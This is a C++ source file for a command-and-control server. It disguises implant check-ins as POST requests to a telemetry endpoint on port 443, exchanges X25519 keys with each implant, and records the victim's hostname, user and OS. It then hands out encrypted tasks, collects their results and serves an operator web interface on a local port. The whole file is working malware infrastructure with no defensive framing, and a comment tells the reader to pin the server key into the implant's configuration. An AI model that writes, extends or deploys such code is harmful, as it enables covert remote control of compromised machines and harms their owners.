#include "op_listener.h"
#include "op_routes.h"
#include "session_router.h"
#include "session_store.h"
#include "shared/crypto.h"
#include "shared/proto.h"
#include "task_queue.h"
#include "tls_listener.h"
#include "webui.h"

#include <csignal>
#include <cstdio>
#include <iostream>
#include <memory>
#include <thread>

server::SessionRouter g_router;
server::TaskQueue g_queue;

namespace {

std::unique_ptr<server::SessionStore> g_store;
std::vector<uint8_t> g_server_priv;
std::vector<uint8_t> g_server_pub;

constexpr char kInfo[] = "c2-session-v2";

std::string SidFromPub(const std::vector<uint8_t> &pub) {
  return crypto::ToHex(std::vector<uint8_t>(pub.begin(), pub.begin() + 16));
}

void HandleHello(const http::Request &req, http::Response &res) {
  if (req.body.size() != 32) {
    std::fprintf(stderr, "[hello] body size %zu != 32\n", req.body.size());
    res.status = 400;
    return;
  }
  std::vector<uint8_t> client_pub(req.body.begin(), req.body.end());

  std::vector<uint8_t> key;
  try {
    key = crypto::DeriveSessionKey(g_server_priv, client_pub, kInfo);
  } catch (const std::exception &e) {
    std::fprintf(stderr, "[hello] derive failed: %s\n", e.what());
    res.status = 400;
    return;
  }

  std::string sid = SidFromPub(client_pub);
  auto *s = g_router.Create(key, g_server_pub, client_pub, sid);
  if (!s) {
    res.status = 500;
    return;
  }
  s->hostname = req.Get("X-Host");
  s->username = req.Get("X-User");
  s->os = req.Get("X-Os");
  if (g_store)
    g_store->AppendEvent(*s, "hello");

  std::vector<uint8_t> plain;
  plain.insert(plain.end(), g_server_pub.begin(), g_server_pub.end());
  plain.insert(plain.end(), sid.begin(), sid.end());

  try {
    auto env = crypto::Seal(key, plain);
    res.status = 200;
    res.headers.emplace_back("Content-Type", "application/octet-stream");
    res.body = std::move(env);
  } catch (...) {
    res.status = 500;
  }
}

void HandleBeacon(const http::Request &req, http::Response &res,
                  proto::Op in_op) {
  std::string sid = req.Get("X-Session-Id");
  if (sid.empty()) {
    res.status = 400;
    return;
  }

  server::Session *s = g_router.Touch(sid);
  if (!s) {
    res.status = 404;
    return;
  }

  std::vector<uint8_t> plain;
  if (!crypto::Open(s->key, req.body, plain)) {
    res.status = 400;
    return;
  }

  proto::Message msg;
  if (!proto::Decode(plain.data(), plain.size(), msg)) {
    res.status = 400;
    return;
  }
  if (msg.header.session_id != sid) {
    res.status = 401;
    return;
  }

  if (in_op == proto::Op::Result) {
    g_queue.StoreResult(sid, msg.header.task_id, uint8_t(in_op), msg.payload);
    g_queue.Confirm(sid, msg.header.task_id);
  }

  server::Task task;
  proto::Message out;
  out.header.session_id = sid;
  out.header.op = uint8_t(proto::Op::NoTask);

  if (g_queue.Dequeue(sid, task)) {
    out.header.op = uint8_t(task.op);
    out.header.task_id = task.id;
    out.payload = std::move(task.payload);
  }

  auto wire = proto::Encode(out);
  try {
    auto env = crypto::Seal(s->key, wire);
    res.status = 200;
    res.headers.emplace_back("Content-Type", "application/octet-stream");
    res.body = std::move(env);
  } catch (...) {
    res.status = 500;
  }
}

void HandleWeb(const http::Request &req, http::Response &res, bool &handled) {
  if (req.path == "/" || req.path == "/index.html") {
    handled = true;
    res.status = 200;
    res.headers.emplace_back("Content-Type", "text/html; charset=utf-8");
    res.headers.emplace_back("Cache-Control", "no-store");
    res.body.assign(webui::kIndexHtml,
                    webui::kIndexHtml + webui::kIndexHtmlLen);
    return;
  }
  if (req.path == "/app.css") {
    handled = true;
    res.status = 200;
    res.headers.emplace_back("Content-Type", "text/css; charset=utf-8");
    res.headers.emplace_back("Cache-Control", "no-store");
    res.body.assign(webui::kAppCss, webui::kAppCss + webui::kAppCssLen);
    return;
  }
  if (req.path == "/app.js") {
    handled = true;
    res.status = 200;
    res.headers.emplace_back("Content-Type",
                             "application/javascript; charset=utf-8");
    res.headers.emplace_back("Cache-Control", "no-store");
    res.body.assign(webui::kAppJs, webui::kAppJs + webui::kAppJsLen);
    return;
  }
  handled = false;
}

void Handle(const http::Request &req, http::Response &res) {
  if (req.path == "/api/v2/telemetry" && req.method == "POST") {
    bool has_sid = !req.Get("X-Session-Id").empty();
    if (!has_sid && req.body.size() == 32) {
      HandleHello(req, res);
      return;
    }
    int op = 1;
    std::string ops = req.Get("X-Op");
    if (!ops.empty()) {
      try {
        op = std::stoi(ops);
      } catch (...) {
      }
    }
    if (op == int(proto::Op::Result))
      HandleBeacon(req, res, proto::Op::Result);
    else
      HandleBeacon(req, res, proto::Op::Beacon);
    return;
  }
  res.status = 404;
}

void HandleIngress(const http::Request &req, http::Response &res) {
  bool handled = false;
  server::HandleOpRoute(req, res, handled);
  if (!handled)
    HandleWeb(req, res, handled);
  if (!handled)
    Handle(req, res);
}

void SweeperThread() {
  while (true) {
    std::this_thread::sleep_for(std::chrono::seconds(30));
    size_t n = g_router.Sweep(std::chrono::minutes(10));
    if (n && g_store) {
      auto list = g_router.List();
      g_store->Save(list);
    }
  }
}

}

int main(int argc, char **argv) {
  server::TlsConfig cfg;
  cfg.cert_file = argc > 1 ? argv[1] : "certs/server.crt";
  cfg.key_file = argc > 2 ? argv[2] : "certs/server.key";
  cfg.port = argc > 3 ? std::atoi(argv[3]) : 443;

  auto kp = crypto::GenerateX25519();
  g_server_priv = kp.priv;
  g_server_pub = kp.pub;
  std::printf("[*] server x25519 pub: %s\n",
              crypto::ToHex(g_server_pub).c_str());
  std::printf("[*] pin this key into implant config.h\n");

  g_store.reset(new server::SessionStore("sessions.jsonl"));

  auto prev = g_store->Load();
  std::printf("[*] restored %zu session records\n", prev.size());

  server::TlsListener listener(cfg);
  if (!listener.Start()) {
    std::fprintf(stderr, "[!] listener start failed (cert/key/port)\n");
    return 1;
  }
  std::printf("[*] listening on :%d\n", cfg.port);

  std::thread(SweeperThread).detach();

  signal(SIGPIPE, SIG_IGN);

  server::OpListener op;
  if (op.Start(8443))
    std::thread([&op]() { op.Accept(HandleIngress); }).detach();
  else
    std::fprintf(stderr, "[!] operator channel failed on 127.0.0.1:8443\n");

  listener.Accept(Handle);
  return 0;
}